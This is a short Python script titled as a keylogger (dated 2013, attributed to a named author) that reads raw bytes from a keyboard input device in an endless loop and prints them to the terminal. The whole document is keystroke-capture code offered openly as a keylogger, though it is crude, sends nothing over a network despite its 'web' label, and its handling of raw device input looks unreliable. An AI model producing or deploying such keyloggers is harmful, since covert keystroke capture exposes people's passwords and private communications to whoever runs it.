'''

Author: Gustavo Martin Vela
Python-web-keylogger
2013

'''

import sys

pipe = open('/dev/input/keyboard','r')
while 1:
    for character in pipe.read(1):
        sys.stdout.write(repr(character))
        sys.stdout.flush()